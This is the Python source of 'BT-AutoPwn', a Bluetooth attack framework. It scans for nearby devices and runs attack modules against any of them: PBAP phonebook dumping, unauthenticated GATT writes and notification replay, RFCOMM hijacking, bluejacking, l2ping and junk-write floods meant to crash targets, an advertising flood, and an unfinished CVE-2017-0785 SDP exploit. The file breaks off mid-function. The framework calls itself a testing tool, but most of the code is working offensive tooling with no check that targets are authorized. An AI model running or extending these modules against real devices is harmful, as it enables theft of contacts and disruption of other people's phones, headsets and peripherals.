#!/usr/bin/env python3
"""
BT-AutoPwn v3.0 — Bluetooth Security Testing Framework
Smart adapter auto-selection · BLE/Classic/Audio · CLI + GUI
"""

import argparse, csv, json, os, queue, random, re, shutil, socket
import struct, subprocess, sys, threading, time
from dataclasses import dataclass, field
from datetime import datetime
from queue import Queue, Empty
from typing import Optional

# ── Rich (CLI) ────────────────────────────────────────────────────────────────
from rich.console import Console
from rich.panel   import Panel
from rich.prompt  import Confirm, Prompt
from rich.rule    import Rule
from rich.table   import Table
from rich.text    import Text
from rich         import box
console = Console()

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 1 — CONFIG & CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════════

VERSION    = "3.1"
LOG_DIR    = os.path.expanduser("~/Projects/bt-autopwn/zerosync_logs")
REC_DIR    = os.path.join(LOG_DIR, "recordings")
for _d in (LOG_DIR, REC_DIR): os.makedirs(_d, exist_ok=True)

FAKE_NAMES = [
    "iPhone 15 Pro", "Galaxy S24 Ultra", "AirPods Pro 2", "Xbox Controller",
    "MacBook Pro M3", "Pixel 8 Pro", "JBL Charge 5", "Sony WH-1000XM5",
    "Apple Watch Ultra", "Bose QC45", "Mi Band 8", "Garmin Fenix 7",
    "Nintendo Switch Pro", "Tile Mate", "Logitech MX Keys", "Surface Pro",
]

OUI_DB = {
    "00:1A:7D":"Broadcom","00:1B:DC":"Samsung","00:17:F2":"Apple",
    "00:23:12":"Apple","F4:60:E2":"Apple","34:C0:59":"Apple",
    "DC:A6:32":"Raspberry Pi","B8:27:EB":"Raspberry Pi",
    "E4:5F:01":"Raspberry Pi","28:CD:C1":"Raspberry Pi",
    "00:1E:AE":"Sony","00:24:BE":"Sony","AC:9B:0A":"Sony",
    "00:26:B4":"Jabra","50:C2:ED":"Jabra","FC:58:FA":"Bose",
    "04:52:C7":"Bose","00:1F:20":"Logitech","00:1D:D8":"Microsoft",
    "44:D4:E0":"OnePlus","8C:79:F5":"Huawei","00:12:A1":"Nokia",
}

VULN_DB = {
    "HID":   {"vulns":["MouseJack CVE-2016-10761","HID injection"],          "attacks":["hid_inject"],                                  "severity":"HIGH",    "desc":"Clavier/souris — injection frappes"},
    "A2DP":  {"vulns":["BlueBorne CVE-2017-1000251","Audio intercept"],       "attacks":["audio_intercept","blueborne"],                  "severity":"HIGH",    "desc":"Audio streaming — interception possible"},
    "HFP":   {"vulns":["Microphone interception","Audio tap"],                "attacks":["audio_intercept"],                             "severity":"CRITICAL","desc":"Mains-libres — micro interceptable"},
    "HSP":   {"vulns":["Headset audio tap"],                                  "attacks":["audio_intercept"],                             "severity":"HIGH",    "desc":"Casque — audio tap"},
    "RFCOMM":{"vulns":["Unauthorized access","RFCOMM hijack"],                "attacks":["rfcomm_scan","rfcomm_connect"],                 "severity":"HIGH",    "desc":"Canal série non authentifié"},
    "GATT":  {"vulns":["MITM BLE","Unauthenticated write","Notif replay"],    "attacks":["ble_mitm","gatt_write","notif_replay","ble_crasher"],"severity":"HIGH","desc":"BLE GATT — MITM et replay"},
    "SDP":   {"vulns":["Info leak","CVE-2017-0785"],                          "attacks":["sdp_enum","cve_2017_0785"],                     "severity":"HIGH",    "desc":"Service Discovery — info leak"},
    "OPP":   {"vulns":["Bluejacking","File push"],                            "attacks":["bluejack","obex_push"],                        "severity":"MEDIUM",  "desc":"Object Push"},
    "PBAP":  {"vulns":["Contact exfiltration"],                               "attacks":["pbap_dump"],                                   "severity":"HIGH",    "desc":"Phonebook Access"},
    "BNEP":  {"vulns":["BlueBorne RCE CVE-2017-1000250"],                     "attacks":["blueborne"],                                   "severity":"CRITICAL","desc":"Network Encap — RCE"},
    "PAN":   {"vulns":["BlueBorne RCE CVE-2017-1000250"],                     "attacks":["blueborne"],                                   "severity":"CRITICAL","desc":"PAN — BlueBorne"},
}

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 2 — DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class BTDevice:
    mac:             str
    name:            str            = "Unknown"
    rssi:            Optional[int]  = None
    dev_type:        str            = "Classic"   # Classic | BLE | Dual
    services:        list           = field(default_factory=list)
    characteristics: list           = field(default_factory=list)
    manufacturer:    str            = ""
    vulnerabilities: list           = field(default_factory=list)
    attack_surface:  list           = field(default_factory=list)
    first_seen:      str            = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))
    last_seen:       str            = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))
    lmp_version:     str            = ""
    reachable:       Optional[bool] = None

@dataclass
class LogEntry:
    ts:    str
    level: str   # INFO WARN SUCCESS ERROR ATTACK
    msg:   str

@dataclass
class AdapterInfo:
    iface:       str
    mac:         str            = "??"
    bt_version:  str            = "?"
    has_classic: bool           = True
    has_ble:     bool           = False
    dev_type:    str            = "CLASSIC"   # CLASSIC | BLE_ONLY | DUAL
    chip:        str            = ""
    up:          bool           = True
    in_use:      bool           = False
    score:       int            = 0

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 3 — SESSION LOGGER
# ═══════════════════════════════════════════════════════════════════════════════

class SessionLogger:
    def __init__(self):
        self.entries: list[LogEntry] = []
        self._cbs:    list           = []
        self._lock    = threading.Lock()

    def subscribe(self, cb): self._cbs.append(cb)

    def log(self, msg: str, level: str = "INFO"):
        e = LogEntry(ts=datetime.now().strftime("%H:%M:%S"), level=level, msg=msg)
        with self._lock:
            self.entries.append(e)
        for cb in self._cbs:
            try: cb(e)
            except Exception: pass

    def info(self, m):    self.log(m, "INFO")
    def warn(self, m):    self.log(m, "WARN")
    def success(self, m): self.log(m, "SUCCESS")
    def error(self, m):   self.log(m, "ERROR")
    def attack(self, m):  self.log(m, "ATTACK")

    def export_json(self, path, devices, results):
        data = {
            "session": datetime.now().isoformat(), "version": VERSION,
            "log": [{"ts":e.ts,"level":e.level,"msg":e.msg} for e in self.entries],
            "devices": [
                {"mac":d.mac,"name":d.name,"type":d.dev_type,"manufacturer":d.manufacturer,
                 "rssi":d.rssi,"first_seen":d.first_seen,"last_seen":d.last_seen,
                 "services":d.services,"vulnerabilities":d.vulnerabilities,
                 "attack_surface":[a for a,_ in d.attack_surface]}
                for d in devices
            ],
            "attack_results": results,
        }
        with open(path,"w") as f: json.dump(data, f, indent=2)

    def export_txt(self, path):
        with open(path,"w") as f:
            [f.write(f"[{e.ts}][{e.level:7}] {e.msg}\n") for e in self.entries]

    def export_csv(self, path):
        with open(path,"w",newline="") as f:
            w = csv.writer(f); w.writerow(["ts","level","msg"])
            [w.writerow([e.ts,e.level,e.msg]) for e in self.entries]

SESSION = SessionLogger()

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4 — SHELL HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def run(cmd: str, timeout: int = 10) -> tuple[str, str, int]:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired: return "", "TIMEOUT", -1
    except Exception as e:            return "", str(e), -1

def run_bg(cmd: str) -> subprocess.Popen:
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, text=True)

def require_root():
    if os.geteuid() != 0:
        print("[!] Root requis : sudo python3 bt_autopwn.py"); sys.exit(1)

def _oui(mac: str) -> str:
    return OUI_DB.get(mac[:8].upper(), "")

def _rand_mac() -> str:
    return ":".join(f"{random.randint(0,255):02X}" for _ in range(6))

def _rssi_bar(rssi: Optional[int]) -> str:
    if rssi is None: return "  N/A "
    if rssi >= -50:  bars, col = 4, "green"
    elif rssi >= -65: bars, col = 3, "yellow"
    elif rssi >= -80: bars, col = 2, "orange3"
    else:            bars, col = 1, "red"
    return f"[{col}]{'█'*bars}{'░'*(4-bars)}[/{col}] {rssi:+d}"

def _dep_check():
    needed  = {"hcitool":"bluez","hciconfig":"bluez","bluetoothctl":"bluez",
                "l2ping":"bluez","sdptool":"bluez-tools","gatttool":"bluez",
                "bettercap":"bettercap","btmgmt":"bluez","parecord":"pulseaudio-utils"}
    missing = []
    for tool, pkg in needed.items():
        if not shutil.which(tool):
            missing.append((tool, pkg))
    return missing

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 5 — SMART ADAPTER MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

# Maps attack id → required capability
ATK_CAPS = {
    "ble_scan":"ble","ble_mitm":"ble","notif_replay":"ble","ble_deauth":"ble",
    "ble_crasher":"ble","zerojam":"ble","gatt_write":"ble","bettercap_ble":"ble",
    "classic_scan":"classic","audio_intercept":"classic","rfcomm_scan":"classic",
    "rfcomm_connect":"classic","sdp_enum":"classic","blueborne":"classic",
    "cve_2017_0785":"classic","pbap_dump":"classic","hid_inject":"classic",
    "obex_push":"classic","bluejack":"classic",
    "mac_spoof":"any","alias_loop":"any","zerojam_global":"ble",
}

class AdapterManager:
    def __init__(self):
        self.adapters: dict[str, AdapterInfo] = {}
        self._lock = threading.Lock()

    def scan(self):
        out, _, _ = run("hciconfig -a 2>/dev/null || hciconfig 2>/dev/null")
        ifaces = re.findall(r"(hci\d+):", out)
        if not ifaces:
            # Try btmgmt
            bm_out, _, _ = run("btmgmt info 2>/dev/null")
            ifaces = re.findall(r"hci(\d+)", bm_out)
            ifaces = [f"hci{i}" for i in ifaces]

        with self._lock:
            self.adapters.clear()
            for iface in ifaces:
                info = self._probe(iface)
                self.adapters[iface] = info
                SESSION.info(f"Adapter {iface}: {info.dev_type} BT{info.bt_version} [{info.mac}] chip={info.chip or '?'}")

        if not self.adapters:
            SESSION.warn("Aucun adaptateur BT détecté — vérifie que les dongles sont branchés")

    def _probe(self, iface: str) -> AdapterInfo:
        info = AdapterInfo(iface=iface)

        # Basic info from hciconfig
        hci_out, _, _ = run(f"hciconfig {iface} -a 2>/dev/null")
        m = re.search(r"BD Address:\s+([0-9A-Fa-f:]{17})", hci_out)
        if m: info.mac = m.group(1).upper()

        info.up = "UP" in hci_out and "DOWN" not in hci_out.split("UP")[0]

        # BT version from hciconfig version
        ver_out, _, _ = run(f"hciconfig {iface} version 2>/dev/null")
        m = re.search(r"HCI Version:\s+(\S+)", ver_out)
        if m: info.bt_version = m.group(1)

        # Check LE support
        feat_out, _, _ = run(f"hciconfig {iface} features 2>/dev/null")
        has_le = bool(re.search(r"LE\s+Support|LE Support|Low Energy|le support", feat_out, re.IGNORECASE))

        # Check via btmgmt (more reliable)
        bm_out, _, _ = run(f"btmgmt -i {iface} info 2>/dev/null")
        if "le" in bm_out.lower():     has_le = True
        has_classic = "bredr" in bm_out.lower() or True  # assume classic if unsure

        # Try to detect chip from lsusb / dmesg
        lsusb_out, _, _ = run("lsusb 2>/dev/null")
        for chip_kw in ["Realtek","Broadcom","Qualcomm","Intel","MediaTek","Cambridge Silicon"]:
            if chip_kw.lower() in lsusb_out.lower():
                info.chip = chip_kw; break

        # Determine type
        if has_le and has_classic: info.dev_type = "DUAL"
        elif has_le:               info.dev_type = "BLE_ONLY"
        else:                      info.dev_type = "CLASSIC"

        info.has_ble     = has_le
        info.has_classic = has_classic

        # Score: DUAL=10, BLE_ONLY=5, CLASSIC=3
        info.score = {"DUAL":10,"BLE_ONLY":5,"CLASSIC":3}.get(info.dev_type, 1)

        return info

    def best(self, cap: str = "any") -> Optional[str]:
        with self._lock:
            if not self.adapters: return None
            def ok(info: AdapterInfo) -> bool:
                if cap == "ble"     and not info.has_ble:     return False
                if cap == "classic" and not info.has_classic: return False
                return True
            cands = [(iface, i) for iface, i in self.adapters.items() if ok(i)]
            if not cands:
                cands = list(self.adapters.items())
            # prefer free, then highest score
            cands.sort(key=lambda x: (x[1].in_use, -x[1].score))
            return cands[0][0] if cands else None

    def pair_for_mitm(self) -> tuple[Optional[str], Optional[str]]:
        ifaces = list(self.adapters.keys())
        if len(ifaces) >= 2:
            return ifaces[0], ifaces[1]
        return (ifaces[0] if ifaces else None), None

    def mark(self, iface: str, in_use: bool):
        with self._lock:
            if iface in self.adapters:
                self.adapters[iface].in_use = in_use

    def up(self, iface: str):
        run(f"hciconfig {iface} up 2>/dev/null")
        run(f"hciconfig {iface} piscan 2>/dev/null")

    @property
    def primary(self) -> Optional[str]:
        return self.best("any")

    @property
    def secondary(self) -> Optional[str]:
        with self._lock:
            ifaces = list(self.adapters.keys())
        p = self.primary
        others = [i for i in ifaces if i != p]
        return others[0] if others else None

    def status_lines(self) -> list[str]:
        lines = []
        with self._lock:
            for iface, info in self.adapters.items():
                status = "🔴 IN USE" if info.in_use else "🟢 FREE"
                lines.append(
                    f"{iface}  {info.mac}  {info.dev_type:<9}  BT{info.bt_version}  {info.chip or 'unknown chip'}  {status}"
                )
        return lines or ["Aucun adaptateur détecté"]

ADAPTERS = AdapterManager()

def get_iface(attack_id: str = "any") -> str:
    cap = ATK_CAPS.get(attack_id, "any")
    iface = ADAPTERS.best(cap)
    if iface:
        SESSION.info(f"Adaptateur sélectionné automatiquement: {iface} (besoin={cap})")
    return iface or "hci0"

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 6 — SCAN ENGINES
# ═══════════════════════════════════════════════════════════════════════════════

def scan_classic(duration: int = 10, log_cb=None) -> list[BTDevice]:
    iface = get_iface("classic_scan")
    ADAPTERS.up(iface)
    SESSION.info(f"BT Classic scan [{iface}] ({duration}s)...")
    out, _, _ = run(f"hcitool -i {iface} scan --flush", timeout=duration + 5)
    devices = []
    for line in out.splitlines():
        m = re.match(r"\s+([0-9A-Fa-f:]{17})\s+(.*)", line)
        if m:
            mac, name = m.group(1).upper(), m.group(2).strip()
            d = BTDevice(mac=mac, name=name or "Unknown", dev_type="Classic")
            d.manufacturer = _oui(mac)
            rssi_o, _, _ = run(f"hcitool -i {iface} rssi {mac}", timeout=4)
            rm = re.search(r"RSSI return value:\s*(-?\d+)", rssi_o)
            d.rssi = int(rm.group(1)) if rm else None
            lmp_o, _, _ = run(f"hcitool -i {iface} info {mac} 2>/dev/null", timeout=6)
            lm = re.search(r"LMP version:\s*(.+)", lmp_o)
            d.lmp_version = lm.group(1).strip() if lm else ""
            devices.append(d)
            msg = f"Classic: {mac}  [{d.name}]  RSSI={d.rssi}"
            SESSION.info(msg)
            if log_cb: log_cb(msg)
    SESSION.success(f"Classic: {len(devices)} appareil(s)")
    return devices

def scan_ble(duration: int = 15, log_cb=None) -> list[BTDevice]:
    iface = get_iface("ble_scan")
    ADAPTERS.up(iface)
    SESSION.info(f"BLE RSSI scan [{iface}] ({duration}s) via btmon...")
    devices: dict[str, BTDevice] = {}

    btmon_p  = run_bg("btmon -T 2>/dev/null")
    lescan_p = run_bg(f"hcitool -i {iface} lescan --duplicate 2>/dev/null")

    deadline = time.time() + duration
    buf = b""
    try:
        while time.time() < deadline:
            chunk = btmon_p.stdout.read(512)
            if chunk:
                buf += chunk
                lines = (buf).split(b"\n"); buf = lines[-1]
                for raw in lines[:-1]:
                    ln = raw.decode(errors="ignore")
                    ma = re.search(r"Address:\s+([0-9A-Fa-f:]{17})", ln)
                    mr = re.search(r"RSSI:\s+(-?\d+)\s*dBm", ln)
                    mn = re.search(r"Name \((?:complete|short)\):\s+(.+)", ln)
                    if ma:
                        mac = ma.group(1).upper()
                        if mac not in devices:
                            d = BTDevice(mac=mac, dev_type="BLE")
                            d.manufacturer = _oui(mac)
                            devices[mac] = d
                            msg = f"BLE: {mac}  [{d.manufacturer or '?'}]"
                            SESSION.info(msg)
                            if log_cb: log_cb(msg)
                    if mr and devices:
                        last = list(devices.values())[-1]
                        last.rssi = int(mr.group(1))
                        last.last_seen = datetime.now().strftime("%H:%M:%S")
                    if mn and devices:
                        last = list(devices.values())[-1]
                        if last.name == "Unknown":
                            last.name = mn.group(1).strip()
            else:
                time.sleep(0.05)
    finally:
        btmon_p.terminate(); lescan_p.terminate()
        run("pkill -f 'hcitool.*lescan' 2>/dev/null")

    # Fallback: bluetoothctl
    if not devices:
        SESSION.warn("btmon vide — fallback bluetoothctl")
        out, _, _ = run(f"timeout {duration} bluetoothctl scan on 2>&1 | grep Device", timeout=duration+3)
        for line in out.splitlines():
            m = re.search(r"Device ([0-9A-Fa-f:]{17})\s*(.*)", line, re.IGNORECASE)
            if m:
                mac = m.group(1).upper()
                if mac not in devices:
                    d = BTDevice(mac=mac, name=m.group(2).strip() or "Unknown", dev_type="BLE")
                    d.manufacturer = _oui(mac)
                    devices[mac] = d

    SESSION.success(f"BLE: {len(devices)} appareil(s)")
    return list(devices.values())

def scan_all(duration: int = 15, log_cb=None) -> list[BTDevice]:
    results: list[BTDevice] = []
    threads = [
        threading.Thread(target=lambda: results.extend(scan_classic(duration, log_cb)), daemon=True),
        threading.Thread(target=lambda: results.extend(scan_ble(duration, log_cb)),     daemon=True),
    ]
    for t in threads: t.start()
    for t in threads: t.join()
    seen, unique = set(), []
    for d in results:
        if d.mac not in seen:
            seen.add(d.mac); unique.append(d)
    return unique

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 7 — SERVICE ENUMERATION + VULN ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════════

def enum_sdp(mac: str) -> list[str]:
    iface = get_iface("sdp_enum")
    out, _, _ = run(f"sdptool browse {mac} 2>/dev/null", timeout=15)
    names  = re.findall(r"Service Name:\s*(.+)", out)
    uuids  = re.findall(r"UUID(?:128)?:\s*([0-9a-fA-F-]+)", out)
    protos = re.findall(r"Protocol:\s*(.+)", out)
    return list(set(names + uuids + protos))

def enum_gatt(mac: str) -> list[dict]:
    iface = get_iface("ble_scan")
    chars = []
    for cmd, typ in [
        (f"gatttool -i {iface} -b {mac} --primary 2>/dev/null",         "service"),
        (f"gatttool -i {iface} -b {mac} --characteristics 2>/dev/null", "char"),
    ]:
        out, _, _ = run(cmd, timeout=10)
        for line in out.splitlines():
            m = re.search(r"(char value handle|handle):\s*(0x\w+).*uuid:\s*([0-9a-fA-F-]+)", line, re.IGNORECASE)
            if m:
                chars.append({"type": typ, "handle": m.group(2), "uuid": m.group(3)})
    return chars

SVC_MAP = {
    "Human Interface":"HID","hid":"HID","1812":"HID",
    "Audio":"A2DP","a2dp":"A2DP","110a":"A2DP","110b":"A2DP","Advanced Audio":"A2DP",
    "Hands-Free":"HFP","hfp":"HFP","111e":"HFP","111f":"HFP",
    "Headset":"HSP","hsp":"HSP","1108":"HSP","1112":"HSP",
    "RFCOMM":"RFCOMM","Serial Port":"RFCOMM","1101":"RFCOMM",
    "Generic Attribute":"GATT","1800":"GATT","1801":"GATT",
    "Service Discovery":"SDP","0001":"SDP",
    "OBEX":"OPP","Object Push":"OPP","1105":"OPP",
    "Phonebook":"PBAP","112f":"PBAP","112e":"PBAP",
    "Network":"BNEP","PAN":"BNEP","0f":"BNEP","1116":"BNEP",
}

def classify_services(services: list) -> list[str]:
    found = []
    for s in services:
        sv = str(s).lower()
        for key, proto in SVC_MAP.items():
            if key.lower() in sv and proto not in found:
                found.append(proto)
    return found

def analyze(dev: BTDevice) -> BTDevice:
    protos = classify_services(dev.services + [str(c) for c in dev.characteristics])
    if dev.dev_type == "BLE"     and "GATT"    not in protos: protos.append("GATT")
    if dev.dev_type == "Classic" and "SDP"     not in protos: protos.append("SDP")
    for p in protos:
        if p in VULN_DB:
            dev.vulnerabilities.extend(VULN_DB[p]["vulns"])
            dev.attack_surface.extend([(a, p) for a in VULN_DB[p]["attacks"]])
    dev.vulnerabilities = list(dict.fromkeys(dev.vulnerabilities))
    dev.attack_surface  = list(dict.fromkeys(dev.attack_surface))
    return dev

def full_enum(dev: BTDevice) -> BTDevice:
    SESSION.info(f"Énumération complète: {dev.mac}")
    if dev.dev_type in ("Classic", "Dual"):
        dev.services = enum_sdp(dev.mac)
        SESSION.info(f"  SDP: {len(dev.services)} service(s)")
    if dev.dev_type in ("BLE", "Dual"):
        chars = enum_gatt(dev.mac)
        dev.characteristics = chars
        dev.services += [c.get("uuid","") for c in chars if c.get("type")=="service"]
        SESSION.info(f"  GATT: {len(chars)} characteristic(s)")
    return analyze(dev)

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 8 — ATTACK MODULES
# ═══════════════════════════════════════════════════════════════════════════════

# ── Recon ──────────────────────────────────────────────────────────────────────

def atk_sdp_enum(dev, **_):
    iface = get_iface("sdp_enum")
    out, _, _ = run(f"sdptool browse {dev.mac}", timeout=20)
    SESSION.info(f"SDP {dev.mac}: {len(out.splitlines())} lignes")
    return out or "Aucun service SDP"

def atk_rfcomm_scan(dev, **_):
    iface = get_iface("rfcomm_scan")
    SESSION.attack(f"RFCOMM scan {dev.mac}")
    open_ch = []
    for ch in range(1, 31):
        out, err, code = run(f"timeout 2 rfcomm connect {iface} {dev.mac} {ch} 2>&1", timeout=4)
        if "Connection refused" not in err and "Cannot" not in err and code != 1:
            open_ch.append(ch)
            SESSION.success(f"  Canal RFCOMM {ch} OUVERT")
    if not open_ch: SESSION.info("Aucun canal RFCOMM ouvert")
    return f"Canaux ouverts: {open_ch}" if open_ch else "Aucun canal RFCOMM ouvert"

def atk_bettercap_ble(dev, **_):
    iface = get_iface("bettercap_ble")
    cap = f"ble.recon on\nevents.stream on\n"
    if dev: cap += f"ble.enum {dev.mac}\n"
    path = "/tmp/bt_autopwn_cap.cap"
    with open(path, "w") as f: f.write(cap)
    SESSION.attack(f"Bettercap BLE recon [{iface}]")
    out, err, _ = run(f"timeout 20 bettercap -iface {iface} -caplet {path} 2>&1", timeout=25)
    macs = set(re.findall(r"[0-9A-Fa-f:]{17}", out+err))
    SESSION.success(f"Bettercap: {len(macs)} MAC(s) vus")
    return (out+err)[:2000] or "Bettercap: aucune sortie"

# ── Exploit ────────────────────────────────────────────────────────────────────

def atk_gatt_write(dev, **_):
    iface = get_iface("gatt_write")
    chars = [c for c in dev.characteristics if c.get("type")=="char"]
    if not chars: return "Aucune characteristic GATT — relancer l'énumération"
    results = []
    for c in chars[:8]:
        h = c.get("handle","0x0001")
        out, _, _ = run(f"gatttool -i {iface} -b {dev.mac} --char-write-req -a {h} -n 00 2>&1", timeout=6)
        status = "ECRIT ✓" if "successfully" in out.lower() else "REFUSÉ"
        results.append(f"  {h}: {status}")
        SESSION.info(f"GATT write {h}: {status}")
    return "\n".join(results)

def atk_rfcomm_connect(dev, **_):
    iface = get_iface("rfcomm_connect")
    out, err, _ = run(f"rfcomm connect {iface} {dev.mac} 1 2>&1", timeout=8)
    SESSION.attack(f"RFCOMM connect → {dev.mac}")
    return out + err

def atk_ble_mitm(dev, **_):
    iface, iface2 = ADAPTERS.pair_for_mitm()
    if not iface2: return "[ERREUR] MITM nécessite 2 adaptateurs"
    SESSION.attack(f"BLE MITM: {iface} ↔ {iface2} → {dev.mac}")
    if shutil.which("btlejuice"):
        return (f"Lancer dans 2 terminaux:\n"
                f"  T1: sudo btlejuice-proxy -u {dev.mac} -i {iface2}\n"
                f"  T2: sudo btlejuice -w -i {iface}\n"
                f"  Web: http://localhost:4000")
    return (f"btlejuice non installé (npm install -g btlejuice)\n"
            f"Fallback gatttool: gatttool -i {iface2} -b {dev.mac} -I")

def atk_notif_replay(dev, **_):
    iface = get_iface("notif_replay")
    SESSION.attack(f"Notification Replay → {dev.mac}")
    SESSION.info("Écoute 10s...")
    proc = run_bg(f"timeout 10 gatttool -i {iface} -b {dev.mac} --listen 2>&1")
    buf = b""
    end = time.time() + 10
    while time.time() < end:
        try: buf += proc.stdout.read(128)
        except: break
        time.sleep(0.1)
    proc.terminate()
    raw = buf.decode(errors="ignore")
    captured = re.findall(r"handle = (0x\w+).*?value: ([0-9a-f ]+)", raw, re.IGNORECASE)
    if not captured: return f"Aucune notification.\nOutput:\n{raw[:400]}"
    SESSION.success(f"Capturé {len(captured)} notification(s) — replay...")
    results = [f"Capturé {len(captured)} notification(s):"]
    for h, v in captured:
        val = v.strip().replace(" ","")
        out, _, _ = run(f"gatttool -i {iface} -b {dev.mac} --char-write-req -a {h} -n {val} 2>&1", timeout=5)
        status = "OK ✓" if "successfully" in out.lower() else "REFUSÉ"
        results.append(f"  handle={h}  val={val[:20]}  → {status}")
    return "\n".join(results)

def atk_pbap_dump(dev, **_):
    out, _, _ = run(f"obexftp -b {dev.mac} -B 17 -l 2>&1", timeout=10)
    if "phonebook" in out.lower():
        dump, _, _ = run(f"obexftp -b {dev.mac} -B 17 --get telecom/pb.vcf 2>&1", timeout=15)
        SESSION.success(f"PBAP dump: {dev.mac}")
        return dump
    return out or "PBAP non accessible"

def atk_obex_push(dev, **_):
    p = "/tmp/bt_autopwn_test.txt"
    with open(p,"w") as f: f.write("BT-AutoPwn OBEX test\n")
    out, err, _ = run(f"obexftp -b {dev.mac} -B 10 --push {p} 2>&1", timeout=15)
    SESSION.attack(f"OBEX push → {dev.mac}")
    return out + err or "obexftp non installé (apt install obexftp)"

def atk_bluejack(dev, **_):
    out, err, _ = run(f"obexftp -b {dev.mac} -B 10 --push /dev/null 2>&1", timeout=10)
    SESSION.attack(f"Bluejack → {dev.mac}")
    return out + err or "obexftp non disponible"

def atk_hid_inject(dev, **_):
    iface = get_iface("hid_inject")
    return (f"[HID Inject] {dev.mac}\n"
            f"  sudo hidclient -a {dev.mac} -i {iface}\n"
            f"  Ou: https://github.com/ernw/hid-injection\n"
            f"  Payload: python3 payload.py --mac {dev.mac}")

# ── DoS ────────────────────────────────────────────────────────────────────────

def atk_ble_deauth(dev, **_):
    iface = get_iface("ble_deauth")
    SESSION.attack(f"BLE Deauth → {dev.mac}")
    r1, _, _ = run(f"l2ping -i {iface} -s 600 -c 30 -f {dev.mac} 2>&1", timeout=20)
    r2, _, _ = run(f"echo -e 'connect {dev.mac}\\ndisconnect {dev.mac}' | bluetoothctl 2>&1", timeout=10)
    for _ in range(5):
        run(f"gatttool -i {iface} -b {dev.mac} --primary 2>/dev/null", timeout=2)
        run(f"hcitool -i {iface} ledc 0x0040 0x13 2>/dev/null", timeout=1)
    SESSION.success(f"Deauth envoyé: {dev.mac}")
    return f"[l2ping flood]\n{r1}\n[HCI disconnect]\n{r2}\n[Flood] 5 cycles connect/disconnect"

def atk_ble_crasher(dev, **_):
    iface = get_iface("ble_crasher")
    SESSION.attack(f"BLE Crasher → {dev.mac}")
    r1, _, _ = run(f"l2ping -i {iface} -s 65000 -c 10 {dev.mac} 2>&1", timeout=15)
    junk = "FF" * 128
    junk_log = []
    for h in [f"0x{i:04X}" for i in range(1, 20)]:
        out, _, _ = run(f"gatttool -i {iface} -b {dev.mac} --char-write -a {h} -n {junk} 2>/dev/null", timeout=2)
        junk_log.append(f"  {h}: {'envoyé' if 'Error' not in out else 'refusé'}")
    flood_n = 0
    for _ in range(20):
        run(f"gatttool -i {iface} -b {dev.mac} --primary 2>/dev/null", timeout=1)
        flood_n += 1
    SESSION.success(f"Crasher terminé — {dev.mac}")
    return f"[L2ping 65K]\n{r1}\n[Junk GATT]\n" + "\n".join(junk_log) + f"\n[Flood] {flood_n} connexions"

_zerojam_stop = threading.Event()

def atk_zerojam(dev, duration=30, **_):
    iface = get_iface("zerojam")
    target = dev.mac if dev else None
    return _zerojam_run(iface, duration, target)

def _zerojam_run(iface: str, duration: int = 30, target: Optional[str] = None) -> str:
    _zerojam_stop.clear()
    SESSION.attack(f"ZeroJam Mesh Flood [{iface}] {duration}s cible={target or 'broadcast'}")
    count = 0
    end = time.time() + duration
    def _flood():
        nonlocal count
        while time.time() < end and not _zerojam_stop.is_set():
            mac = target or _rand_mac()
            mb  = " ".join(f"{int(b,16):02x}" for b in reversed(mac.split(":")))
            run(f"hcitool -i {iface} cmd 0x08 0x0006 A0 00 A0 00 00 00 00 00 00 {mb} 07 00 2>/dev/null", timeout=1)
            rnd = " ".join(f"{random.randint(0,255):02x}" for _ in range(20))
            run(f"hcitool -i {iface} cmd 0x08 0x0008 1f 02 01 06 03 03 aa fe 11 16 aa fe 10 00 03 {rnd} 2>/dev/null", timeout=1)
            run(f"hcitool -i {iface} cmd 0x08 0x000A 01 2>/dev/null", timeout=1)
            count += 1
            if count % 20 == 0: SESSION.info(f"ZeroJam: {count} paquets")
    t = threading.Thread(target=_flood, daemon=True); t.start(); t.join(duration + 1)
    run(f"hcitool -i {iface} cmd 0x08 0x000A 00 2>/dev/null", timeout=2)
    SESSION.success(f"ZeroJam: {count} paquets envoyés")
    return f"ZeroJam terminé\nPaquets: {count}\nCible: {target or 'broadcast'}\nDurée: {duration}s"

# ── CVE ────────────────────────────────────────────────────────────────────────

def atk_blueborne(dev, **_):
    iface = get_iface("blueborne")
    out, _, _ = run(f"hcitool -i {iface} info {dev.mac} 2>/dev/null", timeout=10)
    lmp_m = re.search(r"LMP version:\s*(.+)", out)
    lmp   = lmp_m.group(1).strip() if lmp_m else dev.lmp_version or "inconnu"
    vuln  = any(v in lmp for v in ["0x06","0x07","4.0","4.1","4.2","3.0"])
    SESSION.warn(f"BlueBorne {dev.mac}: {'VULNÉRABLE' if vuln else 'non confirmé'}")
    return f"LMP: {lmp}\nVulnérable BlueBorne probable: {'OUI ⚠' if vuln else 'NON / inconnu'}\n{out[:600]}"

def atk_cve_2017_0785(dev, **_):
    iface = get_iface("cve_2017_0785")
    SESSION.attack(f"CVE-2017-0785 SDP info disclosure → {dev.mac}")
    out, _, _ = run(f"hcitool -i {iface} info {dev.mac} 2>/dev/null", timeout=10)
    lmp_m = re.search(r"LMP version:\s*(.+)", out)
    lmp   = lmp_m.group(1).strip() if lmp_m else "inconnu"
    vuln  = any(v in lmp for v in ["0x06","0x07","4.0","4.1","4.2"])
    result = [f"LMP: {lmp}", f"Vulnérable: {'OUI ⚠' if vuln else 'non confirmé'}"]
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
        sock.settimeout(5); sock.connect((dev.mac, 1))
        # SDP Service Search Request with oversized continuation state
